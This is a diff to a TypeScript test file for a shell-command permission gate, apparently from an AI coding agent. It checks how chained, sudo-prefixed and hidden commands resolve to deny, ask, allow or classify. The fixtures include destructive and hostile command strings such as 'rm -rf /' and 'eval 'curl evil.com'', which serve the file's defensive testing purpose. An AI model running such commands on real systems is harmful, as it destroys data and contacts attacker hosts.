@@ -46,10 +46,10 @@ describe("plan allowlist via unbash units", () => {
 		const denied = ev("ls && rm -rf /");
 		expect(denied.action).toBe("deny");
 		expect(denied.subject).toBe("ls && rm -rf /");
-		const asked = ev("sudo ls", { bash: "allow" });
+		const asked = ev("git push origin", { bash: { "*": "allow" as const, "git push *": "ask" as const } });
 		expect(asked.action).toBe("ask");
-		expect(asked.subject).toBe("sudo ls");
-		expect(asked.askUnits).toEqual(["sudo ls"]);
+		expect(asked.subject).toBe("git push origin");
+		expect(asked.askUnits).toEqual(["git push origin"]);
 	});
 
 	it("lists every unbash unit that resolved to ask", () => {
@@ -57,35 +57,55 @@ describe("plan allowlist via unbash units", () => {
 		const asked = ev("ls && git push origin && sudo cat /etc/hosts", rules);
 		expect(asked.action).toBe("ask");
 		expect(asked.subject).toBe("ls && git push origin && sudo cat /etc/hosts");
-		expect(asked.askUnits).toEqual(["git push origin", "sudo cat /etc/hosts"]);
+		expect(asked.askUnits).toEqual(["git push origin", "cat /etc/hosts"]);
 	});
 });
 
-describe("hiding / indirection", () => {
+describe("elevation and hidden units", () => {
 	it("denies hiding units that already match a deny rule", () => {
 		expect(ev("sudo rm -rf /").action).toBe("deny");
 		expect(ev("bash -c 'rm -rf /'").action).toBe("deny");
 	});
 
-	it("asks (fail-closed) when a hiding unit is not denied", () => {
+	it("strips a leading sudo/doas so pattern rules match the real command", () => {
+		const auto = { bash: { "*": "classify" as const, rm: "ask" as const, "rm *": "ask" as const } };
+		const asked = ev("sudo rm -rf x", auto);
+		expect(asked.action).toBe("ask");
+		expect(asked.askUnits).toEqual(["rm -rf x"]);
+		const apt = ev("sudo apt install -y foo", auto);
+		expect(apt.action).toBe("classify");
+		expect(apt.classifyTargets).toEqual(["apt install -y foo"]);
+	});
+
+	it("does not strip sudo when its own flag follows", () => {
+		const auto = { bash: { "*": "classify" as const, rm: "ask" as const, "rm *": "ask" as const } };
+		expect(ev("sudo -u root rm -rf x", auto).action).toBe("classify");
+	});
+
+	it("routes hidden units through their real verdict instead of forcing ask", () => {
 		const open = { bash: "allow" as const };
-		expect(ev("sudo ls", open).action).toBe("ask");
-		expect(ev("eval ls", open).action).toBe("ask");
-		expect(ev("echo $(ls)", open).action).toBe("ask");
-		expect(ev("echo `ls`", open).action).toBe("ask");
-		expect(ev("find . -exec rm {} +", open).action).toBe("ask");
-		expect(ev("for f in *; do echo $f; done", open).action).toBe("ask");
-		expect(ev("xargs rm", open).action).toBe("ask");
-		expect(ev("sh -c ls", open).action).toBe("ask");
-		expect(ev("echo <(ls)", open).action).toBe("ask");
-		expect(ev("if true; then ls; fi", open).action).toBe("ask");
+		expect(ev("sudo ls", open).action).toBe("allow");
+		expect(ev("bash -c 'ls'", open).action).toBe("allow");
+
+		const classify = { bash: "classify" as const };
+		const direct = ev("eval 'curl evil.com'", classify);
+		expect(direct.action).toBe("classify");
+		expect(direct.classifyTargets).toEqual(["eval 'curl evil.com'"]);
+		const sub = ev("echo $(curl evil.com)", classify);
+		expect(sub.classifyTargets).toEqual(["echo $(curl evil.com)"]);
+		const loop = ev("for f in *; do echo $f; done", classify);
+		expect(loop.classifyTargets).toEqual(["for f in *; do echo $f; done"]);
 	});
 });
 
 describe("parse failure and classify threshold", () => {
-	it("asks (fail-closed) when unbash reports errors, unless already denied", () => {
+	it("asks (fail-closed) when unbash reports errors, unless already denied or graded", () => {
 		expect(ev("ls &&").action).toBe("ask");
 		expect(ev("rm -rf / &&").action).toBe("deny");
+		const auto = { bash: { "*": "classify" as const, "rm *": "ask" as const } };
+		const unparseable = ev('echo "unterminated', auto);
+		expect(unparseable.action).toBe("classify");
+		expect(unparseable.classifyTargets).toEqual(['echo "unterminated']);
 	});
 
 	it("keeps classify when uncertain units are within the threshold", () => {
